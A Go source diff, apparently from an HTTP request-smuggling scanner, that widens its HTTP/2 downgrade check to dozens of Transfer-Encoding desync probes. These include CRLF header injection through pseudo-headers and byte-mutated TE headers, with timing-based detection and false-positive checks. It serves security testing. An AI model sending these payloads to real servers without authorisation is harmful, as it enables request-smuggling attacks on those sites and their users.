@@ -17,6 +17,7 @@ package scan
 // and test the most reliable downgrade vectors.
 
 import (
+	"github.com/smuggled/smuggled/internal/permute"
 	"github.com/smuggled/smuggled/internal/request"
 	"github.com/smuggled/smuggled/internal/config"
 	"bytes"
@@ -53,6 +54,10 @@ func ScanH2Downgrade(target *url.URL, base []byte, cfg config.Config, rep *repor
 		path = "/"
 	}
 	host := target.Hostname()
+	port := target.Port()
+	if port == "" {
+		port = "443"
+	}
 
 	// ── H2.TE: chunk-size inflation attack ──────────────────────────────────
 	//
@@ -82,38 +87,167 @@ func ScanH2Downgrade(target *url.URL, base []byte, cfg config.Config, rep *repor
 	syncedChunkSize := len(h2TEChunkData) // 3
 	h2TESyncedBody := fmt.Sprintf("%x\r\n%s\r\n0\r\n\r\n", syncedChunkSize, h2TEChunkData)
 
-	// Techniques are split into two groups:
+	// h2TEProbe represents one downgrade technique.
 	//
-	// Group A — clean H2 headers (no CRLF in value). These use the standard
-	//   h2RawRequest which creates separate well-formed H2 headers. The server
-	//   won't reject them with PROTOCOL_ERROR. This mirrors the Java plugin's
-	//   "vanilla" and other H2-specific permutations that don't rely on CRLF.
+	// Most techniques use h2RawRequest via extraHeaders — the caller passes a
+	// map of header name → value and h2RawRequest writes each as a separate
+	// HPACK field (AllowIllegalWrites lets CRLF pass through for pseudo-header
+	// injection variants). extraHeaders may include pseudo-header overrides
+	// (:method, :path, :authority) as well as regular headers.
 	//
-	// Group B — CRLF-injected values. These embed \r\n inside a single header
-	//   value to create multiple headers when downgraded to H1. Some H2 servers
-	//   accept this (buggy validation); most reject with PROTOCOL_ERROR.
-	//   These are tried AFTER Group A as a fallback.
-
+	// Two "legacy" techniques (dualchunk / revdualchunk) embed two TE values
+	// inside a single HPACK field value — Go maps can't hold duplicate keys, so
+	// they use the legacy h2RequestWithInjectedHeader path instead.
+	// For these, lHdr/lVal hold the header name and the CRLF-embedded value.
 	type h2TEProbe struct {
-		name       string
-		headerName string
-		value      string
-		useRaw     bool // true = use h2RawRequest (clean H2 headers), false = h2RequestWithInjectedHeader
+		name   string
+		extra  map[string]string // extraHeaders for h2RawRequest path
+		legacy bool              // true → use h2RequestWithInjectedHeader
+		lHdr   string            // legacy: header name
+		lVal   string            // legacy: header value (may contain \r\n)
 	}
 
-	teProbes := []h2TEProbe{
-		// ── Group A: clean H2 headers ─────────────────────────────────────
-		// "vanilla": plain transfer-encoding: chunked — the most important test.
-		// If the front-end preserves TE when downgrading H2→H1, the back-end
-		// processes the body as chunked and the inflated chunk size causes timeout.
-		{"H2.TE-vanilla", "transfer-encoding", "chunked", true},
+	// Build the comprehensive technique list.
+	// Matches all ~65 techniques tested by Burp's HTTP2Scan.java.
+	var teProbes []h2TEProbe
 
-		// ── Group B: CRLF-injected values (fallback) ──────────────────────
-		{"H2.TE-crlf", "transfer-encoding", "chunked\r\nTransfer-Encoding: chunked", false},
-		{"H2.TE-lf", "transfer-encoding", "chunked\nTransfer-Encoding: chunked", false},
-		{"H2.CL-inject", "transfer-encoding", "0\r\nContent-Length: 99", false},
-		{"H2.host-inject", "transfer-encoding", host + "\r\nTransfer-Encoding: chunked", false},
+	// ── Group A: clean H2 headers (h2RawRequest) ──────────────────────────
+
+	// vanilla: plain transfer-encoding: chunked — the most fundamental test.
+	// If the front-end passes TE to the back-end during H2→H1 downgrade,
+	// the inflated chunk size causes timeout.
+	teProbes = append(teProbes, h2TEProbe{
+		name:  "H2.TE-vanilla",
+		extra: map[string]string{"transfer-encoding": "chunked"},
+	})
+
+	// http2case: lowercase :method with TE — tests case-sensitivity of front-end
+	// H2→H1 normalisation. Some front-ends lowercase method but uppercase it on
+	// the back-end; the extra content-length: 0 is a CL.0 amplifier.
+	teProbes = append(teProbes, h2TEProbe{
+		name: "H2.TE-http2case",
+		extra: map[string]string{
+			":method":           "post",
+			":authority":        "",
+			"content-length":    "0",
+			"transfer-encoding": "chunked",
+		},
+	})
+
+	// Dynamic byte-mutation families — match Burp's suffix1, prefix1, namesuffix1.
+	// specialChars (exported as SpecialChars) includes 0x00 for H2 NUL variants.
+	for _, i := range permute.SpecialChars() {
+		b := string([]byte{byte(i)})
+
+		// suffix1: transfer-encoding: chunked<byte>   (byte appended to value)
+		teProbes = append(teProbes, h2TEProbe{
+			name:  fmt.Sprintf("H2.TE-suffix1:%d", i),
+			extra: map[string]string{"transfer-encoding": "chunked" + b},
+		})
+
+		// prefix1: transfer-encoding: <byte>chunked   (byte prepended to value)
+		teProbes = append(teProbes, h2TEProbe{
+			name:  fmt.Sprintf("H2.TE-prefix1:%d", i),
+			extra: map[string]string{"transfer-encoding": b + "chunked"},
+		})
+
+		// namesuffix1: transfer-encoding<byte>: chunked  (byte appended to name)
+		teProbes = append(teProbes, h2TEProbe{
+			name:  fmt.Sprintf("H2.TE-namesuffix1:%d", i),
+			extra: map[string]string{"transfer-encoding" + b: "chunked"},
+		})
+
+		// h2namefuse: transfer-encoding<byte>chunked: (empty value)
+		// Distinct from namesuffix1 — the byte is fused *between* the header name
+		// and the word "chunked", making the full name "transfer-encoding<byte>chunked"
+		// with an empty value. Some H2 servers/proxies split on the byte, recovering
+		// a valid TE header on the back-end.
+		teProbes = append(teProbes, h2TEProbe{
+			name:  fmt.Sprintf("H2.TE-h2namefuse:%d", i),
+			extra: map[string]string{"transfer-encoding" + b + "chunked": ""},
+		})
 	}
+
+	// ── Pseudo-header injection techniques ──────────────────────────────────
+	// These inject Transfer-Encoding via CRLF embedded in :authority, :method,
+	// or :path. When the H2 front-end constructs the H1 request line / Host header
+	// from pseudo-headers, the injected CRLF creates an extra H1 header.
+
+	// h2auth: inject TE via :authority  (→ Host: <host>\r\nTransfer-Encoding: chunked)
+	teProbes = append(teProbes, h2TEProbe{
+		name: "H2.TE-h2auth",
+		extra: map[string]string{
+			":authority": fmt.Sprintf("%s:%s\r\nTransfer-Encoding: chunked\r\nx: x", host, port),
+		},
+	})
+
+	// h2method: inject TE via :method  (→ GET / HTTP/1.1\r\nTransfer-Encoding: chunked)
+	teProbes = append(teProbes, h2TEProbe{
+		name: "H2.TE-h2method",
+		extra: map[string]string{
+			":method": fmt.Sprintf("POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nx: x"),
+		},
+	})
+
+	// h2path: inject TE via :path  (→ / HTTP/1.1\r\nTransfer-Encoding: chunked)
+	teProbes = append(teProbes, h2TEProbe{
+		name: "H2.TE-h2path",
+		extra: map[string]string{
+			":path": fmt.Sprintf("%s HTTP/1.1\r\nTransfer-Encoding: chunked\r\nx: x", path),
+		},
+	})
+
+	// ── Group B: CRLF in a single header value (legacy path) ───────────────
+	// dualchunk: two TE headers fused in one HPACK value via CRLF.
+	// revdualchunk: reversed order. Both require the legacy sender because
+	// Go maps cannot hold duplicate keys.
+
+	teProbes = append(teProbes, h2TEProbe{
+		name:   "H2.TE-dualchunk",
+		legacy: true,
+		lHdr:   "transfer-encoding",
+		lVal:   "chunked\r\nTransfer-Encoding: chunked",
+	})
+	teProbes = append(teProbes, h2TEProbe{
+		name:   "H2.TE-revdualchunk",
+		legacy: true,
+		lHdr:   "transfer-encoding",
+		lVal:   "chunked\r\nTransfer-Encoding: identity",
+	})
+
+	// http2hide: inject TE via a generic header value — Burp uses "foo: b\r\nTE"
+	teProbes = append(teProbes, h2TEProbe{
+		name:   "H2.TE-http2hide",
+		legacy: true,
+		lHdr:   "foo",
+		lVal:   fmt.Sprintf("b\r\nTransfer-Encoding: chunked\r\nx: x"),
+	})
+
+	// Legacy CRLF variants that existed before the refactor — kept for parity.
+	teProbes = append(teProbes, h2TEProbe{
+		name:   "H2.TE-crlf",
+		legacy: true,
+		lHdr:   "transfer-encoding",
+		lVal:   "chunked\r\nTransfer-Encoding: chunked",
+	})
+	teProbes = append(teProbes, h2TEProbe{
+		name:   "H2.TE-lf",
+		legacy: true,
+		lHdr:   "transfer-encoding",
+		lVal:   "chunked\nTransfer-Encoding: chunked",
+	})
+	teProbes = append(teProbes, h2TEProbe{
+		name:   "H2.TE-CL-inject",
+		legacy: true,
+		lHdr:   "transfer-encoding",
+		lVal:   "0\r\nContent-Length: 99",
+	})
+	teProbes = append(teProbes, h2TEProbe{
+		name:   "H2.TE-host-inject",
+		legacy: true,
+		lHdr:   "transfer-encoding",
+		lVal:   fmt.Sprintf("%s\r\nTransfer-Encoding: chunked", host),
+	})
 
 	timeoutThreshold := time.Duration(float64(cfg.Timeout) * request.TimeoutRatio)
 
@@ -121,46 +255,35 @@ func ScanH2Downgrade(target *url.URL, base []byte, cfg config.Config, rep *repor
 	dbg(cfg, "H2.TE attack body: %q (%d bytes), declared chunk=%d actual=%d",
 		h2TEAttackBody, len(h2TEAttackBody), attackChunkSize, len(h2TEChunkData))
 	dbg(cfg, "H2.TE timeout threshold: %v (ratio=%.2f of %v)", timeoutThreshold, request.TimeoutRatio, cfg.Timeout)
+	dbg(cfg, "H2.TE total techniques: %d", len(teProbes))
 
-	// h2TESend dispatches to the correct sender. Returns:
-	//   body    — DATA frame payload (may be empty for legitimate 204/redirects)
-	//   status  — :status pseudo-header (0 if no HEADERS frame was received,
-	//             which we treat as "genuine failure" in v10b detection)
-	//   elapsed — only meaningful for the useRaw=false path; for useRaw=true
-	//             h2TESendTimed measures it externally
-	//   err     — transport-level error
-	//
-	//   useRaw=true  → h2RawRequest (clean H2 headers, no CRLF in values)
-	//   useRaw=false → h2RequestWithInjectedHeader (CRLF embedded in value)
+	// h2TESend dispatches to the correct sender.
+	//   extra path  → h2RawRequest with probe.extra as extraHeaders
+	//   legacy path → h2RequestWithInjectedHeader (CRLF embedded in value)
 	h2TESend := func(probe h2TEProbe, body string) ([]byte, int, time.Duration, error) {
-		if probe.useRaw {
-			extra := map[string]string{probe.headerName: probe.value}
-			resp, err := h2RawRequest(target, "POST", path, host, body, extra, cfg)
-			if err != nil {
-				return nil, 0, 0, err
-			}
-			return resp.Body, resp.Status, 0, nil
+		if probe.legacy {
+			return h2RequestWithInjectedHeader(target, path, host,
+				probe.lHdr, probe.lVal, cfg, body, "")
 		}
-		return h2RequestWithInjectedHeader(target, path, host,
-			probe.headerName, probe.value, cfg, body, "")
-	}
-
-	// h2TESendTimed wraps h2TESend with timing measurement for h2RawRequest
-	h2TESendTimed := func(probe h2TEProbe, body string) ([]byte, int, time.Duration, error) {
 		start := time.Now()
-		resp, status, elapsed, err := h2TESend(probe, body)
-		if probe.useRaw {
-			elapsed = time.Since(start)
+		resp, err := h2RawRequest(target, "POST", path, host, body, probe.extra, cfg)
+		elapsed := time.Since(start)
+		if err != nil {
+			return nil, 0, elapsed, err
 		}
-		return resp, status, elapsed, err
+		return resp.Body, resp.Status, elapsed, nil
 	}
 
 	for _, tech := range teProbes {
 		rep.Log("H2Downgrade: technique=%s", tech.name)
-		dbg(cfg, "H2.TE [%s] header: %s: %q (useRaw=%v)", tech.name, tech.headerName, tech.value, tech.useRaw)
+		if tech.legacy {
+			dbg(cfg, "H2.TE [%s] legacy header: %s: %q", tech.name, tech.lHdr, tech.lVal)
+		} else {
+			dbg(cfg, "H2.TE [%s] extra: %v", tech.name, tech.extra)
+		}
 
 		// ── Step 1: Synced baseline ─────────────────────────────────────────
-		syncedResp, syncedStatus, syncedElapsed, syncedErr := h2TESendTimed(tech, h2TESyncedBody)
+		syncedResp, syncedStatus, syncedElapsed, syncedErr := h2TESend(tech, h2TESyncedBody)
 		if syncedErr != nil {
 			rep.Log("H2Downgrade %s: synced request error: %v", tech.name, syncedErr)
 			dbg(cfg, "H2.TE [%s] SYNCED → ERROR: %v", tech.name, syncedErr)
@@ -174,7 +297,7 @@ func ScanH2Downgrade(target *url.URL, base []byte, cfg config.Config, rep *repor
 		}
 
 		// ── Step 2: Attack probe (inflated chunk size) ──────────────────────
-		resp, attackStatus, elapsed, err := h2TESendTimed(tech, h2TEAttackBody)
+		resp, attackStatus, elapsed, err := h2TESend(tech, h2TEAttackBody)
 		if err != nil {
 			rep.Log("H2Downgrade %s: attack error: %v", tech.name, err)
 			dbg(cfg, "H2.TE [%s] ATTACK → ERROR: %v", tech.name, err)
@@ -186,17 +309,29 @@ func ScanH2Downgrade(target *url.URL, base []byte, cfg config.Config, rep *repor
 			dbg(cfg, "H2.TE [%s] ATTACK resp body (first 200): %q", tech.name, string(resp[:min(200, len(resp))]))
 		}
 
+		// Construct probe string for reporting (best-effort representation)
+		probeHdr := ""
+		if tech.legacy {
+			probeHdr = fmt.Sprintf("%s: %s", tech.lHdr, tech.lVal)
+		} else {
+			for k, v := range tech.extra {
+				probeHdr += fmt.Sprintf("%s: %s\r\n", k, v)
+			}
+		}
+		probeStr := fmt.Sprintf("POST %s HTTP/2\r\nHost: %s\r\n%scontent-length: %d\r\n\r\n%s",
+			path, host, probeHdr, len(h2TEAttackBody), h2TEAttackBody)
+
 		// v10a: timeout-based or delay-based detection
 		delayed := cfg.IsDelayed(elapsed)
 		if elapsed > timeoutThreshold || delayed {
 			// Confirm synced still works
-			_, _, syncedElapsed2, _ := h2TESendTimed(tech, h2TESyncedBody)
+			_, _, syncedElapsed2, _ := h2TESend(tech, h2TESyncedBody)
 			if syncedElapsed2 > timeoutThreshold {
 				rep.Log("H2Downgrade %s: synced also timed out on retry — FP, skipping", tech.name)
 				continue
 			}
 			// Confirm attack reproduces
-			_, _, attackElapsed2, _ := h2TESendTimed(tech, h2TEAttackBody)
+			_, _, attackElapsed2, _ := h2TESend(tech, h2TEAttackBody)
 			if attackElapsed2 <= timeoutThreshold {
 				rep.Log("H2Downgrade %s: attack did not reproduce — flaky, skipping", tech.name)
 				continue
@@ -205,32 +340,40 @@ func ScanH2Downgrade(target *url.URL, base []byte, cfg config.Config, rep *repor
 			// FP validation: broken TE name
 			fpLabel := ""
 			brokenTech := tech
-			brokenTech.headerName = "zransfer-encoding"
-			_, _, brokenElapsed, brokenErr := h2TESendTimed(brokenTech, h2TEAttackBody)
+			if tech.legacy {
+				brokenTech.lHdr = "zransfer-encoding"
+			} else {
+				brokenExtra := make(map[string]string, len(tech.extra))
+				for k, v := range tech.extra {
+					brokenExtra[k] = v
+				}
+				delete(brokenExtra, "transfer-encoding")
+				brokenExtra["zransfer-encoding"] = "chunked"
+				brokenTech.extra = brokenExtra
+			}
+			_, _, brokenElapsed, brokenErr := h2TESend(brokenTech, h2TEAttackBody)
 			if brokenErr == nil && brokenElapsed > timeoutThreshold {
 				fpLabel = " (probably FP)"
 				rep.Log("H2Downgrade %s: broken-TE also timed out — probable FP", tech.name)
 			}
 
-			probe := fmt.Sprintf("POST %s HTTP/2\r\nHost: %s\r\n%s: %s\r\ncontent-length: %d\r\n\r\n%s",
-				path, host, tech.headerName, tech.value, len(h2TEAttackBody), h2TEAttackBody)
 			sev := report.SeverityProbable
 			if fpLabel != "" {
 				sev = report.SeverityInfo
 			}
 			rep.Emit(report.Finding{
-				Target:      target.String(),
-				Method:      "HTTP/2",
-				Severity:    sev,
-				Type:        "H2.TE",
-				Technique:   tech.name + fpLabel,
+				Target:    target.String(),
+				Method:    "HTTP/2",
+				Severity:  sev,
+				Type:      "H2.TE",
+				Technique: tech.name + fpLabel,
 				Description: fmt.Sprintf("H2.TE desync v10a: H2 request with inflated chunk size "+
 					"(declared %d, actual %d) caused timeout while synced request succeeded. "+
 					"The back-end is processing Transfer-Encoding from the downgraded H1 request.",
 					attackChunkSize, len(h2TEChunkData)),
 				Evidence: fmt.Sprintf("elapsed=%v attack_chunk=%d synced_ok=true technique=%s",
 					elapsed, attackChunkSize, tech.name),
-				RawProbe: probe,
+				RawProbe: probeStr,
 			})
 			if cfg.ExitOnFind {
 				return
@@ -243,33 +386,31 @@ func ScanH2Downgrade(target *url.URL, base []byte, cfg config.Config, rep *repor
 		// An empty body alone is NOT sufficient — legitimate 204/304/etc responses
 		// have empty bodies but non-zero status.
 		if attackStatus == 0 && elapsed < timeoutThreshold {
-			_, syncedStatus2, _, syncedErr2 := h2TESendTimed(tech, h2TESyncedBody)
+			_, syncedStatus2, _, syncedErr2 := h2TESend(tech, h2TESyncedBody)
 			if syncedErr2 != nil || syncedStatus2 == 0 {
 				dbg(cfg, "H2.TE [%s] v10b: synced also fails (status=%d) → not TE-specific",
 					tech.name, syncedStatus2)
 				continue
 			}
-			_, attackStatus2, _, _ := h2TESendTimed(tech, h2TEAttackBody)
+			_, attackStatus2, _, _ := h2TESend(tech, h2TEAttackBody)
 			if attackStatus2 != 0 {
 				dbg(cfg, "H2.TE [%s] v10b: attack failure didn't reproduce (status=%d)",
 					tech.name, attackStatus2)
 				continue
 			}
 
-			probe := fmt.Sprintf("POST %s HTTP/2\r\nHost: %s\r\n%s: %s\r\ncontent-length: %d\r\n\r\n%s",
-				path, host, tech.headerName, tech.value, len(h2TEAttackBody), h2TEAttackBody)
 			rep.Emit(report.Finding{
-				Target:      target.String(),
-				Method:      "HTTP/2",
-				Severity:    report.SeverityProbable,
-				Type:        "H2.TE",
-				Technique:   tech.name,
+				Target:    target.String(),
+				Method:    "HTTP/2",
+				Severity:  report.SeverityProbable,
+				Type:      "H2.TE",
+				Technique: tech.name,
 				Description: fmt.Sprintf("H2.TE desync v10b: H2 request with inflated chunk size "+
 					"(declared %d, actual %d) caused connection failure while synced request succeeded.",
 					attackChunkSize, len(h2TEChunkData)),
 				Evidence: fmt.Sprintf("response_empty=true attack_chunk=%d synced_ok=true technique=%s",
 					attackChunkSize, tech.name),
-				RawProbe: probe,
+				RawProbe: probeStr,
 			})
 			if cfg.ExitOnFind {
 				return
@@ -279,8 +420,6 @@ func ScanH2Downgrade(target *url.URL, base []byte, cfg config.Config, rep *repor
 
 		// Secondary check: back-end error strings in body.
 		if h2BodySuspicious(resp) {
-			probe := fmt.Sprintf("POST %s HTTP/2\r\nHost: %s\r\n%s: %s\r\ncontent-length: %d\r\n\r\n%s",
-				path, host, tech.headerName, tech.value, len(h2TEAttackBody), h2TEAttackBody)
 			rep.Emit(report.Finding{
 				Target:      target.String(),
 				Method:      "HTTP/2",
@@ -289,7 +428,7 @@ func ScanH2Downgrade(target *url.URL, base []byte, cfg config.Config, rep *repor
 				Technique:   tech.name,
 				Description: "H2→H1 downgrade with injected TE caused back-end rejection — possible desync",
 				Evidence:    fmt.Sprintf("elapsed=%v h2_body_suspicious=true", elapsed),
-				RawProbe:    probe,
+				RawProbe:    probeStr,
 				RawResponse: request.Truncate(string(resp), 256),
 			})
 			if cfg.ExitOnFind {
